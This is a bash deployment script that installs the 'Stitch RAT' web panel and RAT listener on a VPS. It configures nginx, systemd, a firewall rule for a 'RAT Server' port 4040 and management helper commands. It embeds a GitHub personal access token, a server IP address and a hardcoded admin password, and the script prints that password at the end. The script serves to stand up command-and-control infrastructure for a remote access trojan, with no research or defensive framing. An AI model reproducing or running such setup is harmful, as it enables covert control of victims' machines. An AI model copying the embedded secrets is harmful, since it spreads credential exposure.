#!/bin/bash
# VPS Deployment with GitHub Token
# This script automatically handles GitHub authentication

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# GitHub Configuration with Token
GITHUB_USER="oranolio956"
GITHUB_REPO="flipperflipper"
GITHUB_TOKEN="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"
GITHUB_BRANCH="cursor/setup-and-manage-vps-with-plesk-1813"

# VPS Configuration
VPS_IP="50.21.187.77"
APP_USER="stitchrat"
APP_DIR="/opt/stitchrat"
ADMIN_PASSWORD="StitchRAT_SecurePass_2025!"

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  Stitch RAT VPS Deployment with Token ${NC}"
echo -e "${BLUE}========================================${NC}"

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}This script must be run as root${NC}"
   exit 1
fi

echo -e "${YELLOW}Step 1: Updating system packages...${NC}"
apt update && apt upgrade -y

echo -e "${YELLOW}Step 2: Installing system dependencies...${NC}"
apt install -y git curl wget unzip python3 python3-pip python3-venv nginx supervisor ufw htop
apt install -y build-essential libssl-dev libffi-dev python3-dev
apt install -y libjpeg-dev zlib1g-dev libfreetype6-dev liblcms2-dev
apt install -y libwebp-dev tcl8.6-dev tk8.6-dev python3-tk
apt install -y redis-server sqlite3 fail2ban logrotate

echo -e "${YELLOW}Step 3: Creating application user and directories...${NC}"
if ! id "$APP_USER" &>/dev/null; then
    useradd -m -s /bin/bash $APP_USER
    echo -e "${GREEN}Created user: $APP_USER${NC}"
fi

if [ -d "$APP_DIR" ]; then
    echo -e "${YELLOW}Removing existing installation...${NC}"
    rm -rf $APP_DIR
fi

mkdir -p $APP_DIR
chown $APP_USER:$APP_USER $APP_DIR

echo -e "${YELLOW}Step 4: Cloning repository with token authentication...${NC}"
cd /opt

# Clone using token authentication
git clone https://$GITHUB_USER:$GITHUB_TOKEN@github.com/$GITHUB_USER/$GITHUB_REPO.git stitchrat-temp -b $GITHUB_BRANCH

# Move contents to proper directory
mv stitchrat-temp/* $APP_DIR/
mv stitchrat-temp/.* $APP_DIR/ 2>/dev/null || true
rm -rf stitchrat-temp

chown -R $APP_USER:$APP_USER $APP_DIR

echo -e "${YELLOW}Step 5: Setting up Python virtual environment...${NC}"
sudo -u $APP_USER python3 -m venv $APP_DIR/venv

echo -e "${YELLOW}Step 6: Installing Python dependencies...${NC}"
sudo -u $APP_USER $APP_DIR/venv/bin/pip install --upgrade pip setuptools wheel
sudo -u $APP_USER $APP_DIR/venv/bin/pip install cryptography

if [ -f "$APP_DIR/requirements.txt" ]; then
    sudo -u $APP_USER $APP_DIR/venv/bin/pip install -r $APP_DIR/requirements.txt
else
    echo -e "${YELLOW}Installing basic dependencies...${NC}"
    sudo -u $APP_USER $APP_DIR/venv/bin/pip install flask flask-socketio flask-limiter flask-wtf pycryptodome python-dotenv colorama requests mss pillow python-dateutil redis psutil pytest
fi

echo -e "${YELLOW}Step 7: Creating environment configuration...${NC}"
cat > $APP_DIR/.env << EOF
# Production Configuration for Stitch RAT
STITCH_HOST=0.0.0.0
STITCH_PORT=5000
STITCH_DEBUG=false
STITCH_SERVER_PORT=4040

# Security Settings
STITCH_ADMIN_USER=admin
STITCH_ADMIN_PASSWORD=$ADMIN_PASSWORD
STITCH_SECRET_KEY=$(openssl rand -hex 32)
STITCH_REQUIRE_STRONG_PASSWORD=true
STITCH_MIN_PASSWORD_LENGTH=12

# HTTPS Configuration
STITCH_ENABLE_HTTPS=true
STITCH_SSL_AUTO_GENERATE=true
STITCH_SSL_CN=$VPS_IP

# Rate Limiting
STITCH_MAX_LOGIN_ATTEMPTS=3
STITCH_LOGIN_LOCKOUT_MINUTES=15
STITCH_COMMANDS_PER_MINUTE=20
STITCH_EXECUTIONS_PER_MINUTE=40

# Logging
STITCH_LOG_LEVEL=INFO
STITCH_ENABLE_FILE_LOGGING=true
STITCH_ENABLE_SYSLOG=true

# Connection Management
STITCH_MAX_CONNECTIONS=50
STITCH_CONNECTION_TIMEOUT_SECONDS=300
STITCH_HEARTBEAT_INTERVAL_SECONDS=30

# Redis Configuration
STITCH_REDIS_URL=redis://localhost:6379/0

# Session Configuration
STITCH_SESSION_TIMEOUT=30

# GitHub Configuration
GITHUB_REPO=$GITHUB_USER/$GITHUB_REPO
GITHUB_BRANCH=$GITHUB_BRANCH
DEPLOYMENT_DATE=$(date -u +"%Y-%m-%d %H:%M:%S UTC")
EOF

chown $APP_USER:$APP_USER $APP_DIR/.env
chmod 600 $APP_DIR/.env

sudo -u $APP_USER mkdir -p $APP_DIR/{logs,uploads,downloads,temp,certs,static}

echo -e "${YELLOW}Step 8: Configuring Nginx reverse proxy...${NC}"
cat > /etc/nginx/sites-available/stitchrat << EOF
limit_req_zone \$binary_remote_addr zone=login:10m rate=5r/m;
limit_req_zone \$binary_remote_addr zone=api:10m rate=30r/m;

server {
    listen 80;
    server_name $VPS_IP _;
    return 301 https://\$server_name\$request_uri;
}

server {
    listen 443 ssl http2;
    server_name $VPS_IP _;
    
    ssl_certificate $APP_DIR/certs/cert.pem;
    ssl_private_key $APP_DIR/certs/key.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers off;
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 10m;
    
    add_header X-Frame-Options DENY always;
    add_header X-Content-Type-Options nosniff always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    
    server_tokens off;
    client_max_body_size 100M;
    
    location /login {
        limit_req zone=login burst=3 nodelay;
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
    }
    
    location /api/ {
        limit_req zone=api burst=10 nodelay;
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
    }
    
    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
        
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection "upgrade";
        
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 60s;
        
        proxy_buffering on;
        proxy_buffer_size 4k;
        proxy_buffers 8 4k;
    }
    
    location /static/ {
        alias $APP_DIR/static/;
        expires 1y;
        add_header Cache-Control "public, immutable";
        gzip on;
        gzip_types text/css application/javascript image/svg+xml;
    }
    
    location /health {
        access_log off;
        proxy_pass http://127.0.0.1:5000;
    }
}
EOF

ln -sf /etc/nginx/sites-available/stitchrat /etc/nginx/sites-enabled/
rm -f /etc/nginx/sites-enabled/default
nginx -t

echo -e "${YELLOW}Step 9: Creating systemd service...${NC}"
cat > /etc/systemd/system/stitchrat.service << EOF
[Unit]
Description=Stitch RAT Web Interface
After=network.target redis.service
Wants=redis.service

[Service]
Type=simple
User=$APP_USER
Group=$APP_USER
WorkingDirectory=$APP_DIR
Environment=PATH=$APP_DIR/venv/bin
EnvironmentFile=$APP_DIR/.env
ExecStart=$APP_DIR/venv/bin/python web_app_real.py
ExecReload=/bin/kill -HUP \$MAINPID
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal
SyslogIdentifier=stitchrat

NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=$APP_DIR
CapabilityBoundingSet=CAP_NET_BIND_SERVICE

LimitNOFILE=65536
LimitNPROC=4096

[Install]
WantedBy=multi-user.target
EOF

echo -e "${YELLOW}Step 10: Configuring firewall...${NC}"
ufw --force enable
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp comment 'SSH'
ufw allow 80/tcp comment 'HTTP'
ufw allow 443/tcp comment 'HTTPS'
ufw allow 8443/tcp comment 'Plesk'
ufw allow 4040/tcp comment 'RAT Server'
ufw allow from 127.0.0.1 to any port 6379

echo -e "${YELLOW}Step 11: Starting services...${NC}"
systemctl enable redis-server
systemctl start redis-server
systemctl enable fail2ban
systemctl start fail2ban

systemctl daemon-reload
systemctl enable stitchrat
systemctl enable nginx

systemctl start nginx || true
systemctl start stitchrat

echo -e "${YELLOW}Waiting for SSL certificates to be generated...${NC}"
sleep 10
systemctl restart nginx

echo -e "${YELLOW}Step 12: Creating management scripts...${NC}"
cat > /usr/local/bin/stitchrat-status << 'EOF'
#!/bin/bash
echo "=== Stitch RAT System Status ==="
echo "Application Service:"
systemctl status stitchrat --no-pager -l
echo ""
echo "Nginx Service:"
systemctl status nginx --no-pager -l
echo ""
echo "Redis Service:"
systemctl status redis-server --no-pager -l
echo ""
echo "Firewall Status:"
ufw status
echo ""
echo "Recent Logs:"
journalctl -u stitchrat --no-pager -n 10
EOF

cat > /usr/local/bin/stitchrat-restart << 'EOF'
#!/bin/bash
echo "Restarting Stitch RAT services..."
systemctl restart stitchrat
systemctl restart nginx
echo "Services restarted."
EOF

cat > /usr/local/bin/stitchrat-update << 'EOF'
#!/bin/bash
echo "Updating Stitch RAT from GitHub..."
cd /opt/stitchrat
sudo -u stitchrat git pull origin cursor/setup-and-manage-vps-with-plesk-1813
sudo -u stitchrat /opt/stitchrat/venv/bin/pip install -r requirements.txt --upgrade
systemctl restart stitchrat
echo "Update complete!"
EOF

chmod +x /usr/local/bin/stitchrat-status
chmod +x /usr/local/bin/stitchrat-restart
chmod +x /usr/local/bin/stitchrat-update

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}  🎉 DEPLOYMENT SUCCESSFUL! 🎉        ${NC}"
echo -e "${GREEN}========================================${NC}"
echo ""
echo -e "${BLUE}Access Information:${NC}"
echo -e "🌐 Web Interface: ${GREEN}https://$VPS_IP${NC}"
echo -e "👤 Admin Username: ${GREEN}admin${NC}"
echo -e "🔑 Admin Password: ${GREEN}$ADMIN_PASSWORD${NC}"
echo -e "🔌 RAT Server Port: ${GREEN}4040${NC}"
echo -e "⚙️ Plesk Panel: ${GREEN}https://$VPS_IP:8443${NC}"
echo ""
echo -e "${BLUE}Management Commands:${NC}"
echo -e "📊 Check Status: ${GREEN}stitchrat-status${NC}"
echo -e "🔄 Restart Services: ${GREEN}stitchrat-restart${NC}"
echo -e "⬆️ Update from GitHub: ${GREEN}stitchrat-update${NC}"
echo -e "📝 View Logs: ${GREEN}journalctl -u stitchrat -f${NC}"
echo ""

echo -e "${YELLOW}Final Status Check:${NC}"
sleep 3
stitchrat-status

echo ""
echo -e "${GREEN}🎉 Your Stitch RAT is ready at: https://$VPS_IP${NC}"